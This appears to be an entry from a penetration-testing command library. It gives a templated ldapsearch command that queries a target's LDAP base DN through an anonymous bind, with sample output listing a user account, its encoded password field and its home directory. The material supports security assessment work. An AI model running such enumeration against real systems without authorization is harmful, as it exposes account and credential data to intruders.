---
id: a18b7836-4684-41af-8005-d17585ffcefe
name: Query the Base DN with Anonymous Bind
type: command
executor: bash
data: ldapsearch -x -h $_TARGET_IP -b 'dc=$_ENTRY1,dc=$_ENTRY2'
output: "root@kali:~# ldapsearch -x -h 10.10.10.10 -b 'dc=corporatehq,dc=com'\n# extended\
  \ LDIF\n#\n# LDAPv3\n# base <dc=corporatehq,dc=com> with scope subtree\n# filter:\
  \ (objectclass=*)\n# requesting: ALL\n#\n\n# corporatehq.com\ndn: dc=corporatehq,dc=com\n\
  dc: corporatehq\nobjectClass: top\nobjectClass: domain\n\n# passwd, corporatehq.com\n\
  dn: ou=passwd,dc=corporatehq,dc=com\nou: passwd\nobjectClass: top\nobjectClass:\
  \ organizationalUnit\n\n# bob, passwd, corporatehq.com\ndn: uid=bob8791,ou=passwd,dc=corporatehq,dc=com\n\
  uid: bob\ncn: Bob\nobjectClass: account\nobjectClass: posixAccount\nobjectClass:\
  \ top\nuserPassword:: e0JTREFVVEh9Ym9i \nuidNumber: 5001\ngidNumber: 5001\ngecos:\
  \ Bob\nhomeDirectory: /home/bob\nloginShell: /bin/sh"
created_at: '2019-12-15T22:33:38.234260+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Query the Base DN with Anonymous Bind

```bash
ldapsearch -x -h $_TARGET_IP -b 'dc=$_ENTRY1,dc=$_ENTRY2'
```

## Expected Output

```
root@kali:~# ldapsearch -x -h 10.10.10.10 -b 'dc=corporatehq,dc=com'
# extended LDIF
#
# LDAPv3
# base <dc=corporatehq,dc=com> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# corporatehq.com
dn: dc=corporatehq,dc=com
dc: corporatehq
objectClass: top
objectClass: domain

# passwd, corporatehq.com
dn: ou=passwd,dc=corporatehq,dc=com
ou: passwd
objectClass: top
objectClass: organizationalUnit

# bob, passwd, corporatehq.com
dn: uid=bob8791,ou=passwd,dc=corporatehq,dc=com
uid: bob
cn: Bob
objectClass: account
objectClass: posixAccount
objectClass: top
userPassword:: e0JTREFVVEh9Ym9i 
uidNumber: 5001
gidNumber: 5001
gecos: Bob
homeDirectory: /home/bob
loginShell: /bin/sh
```
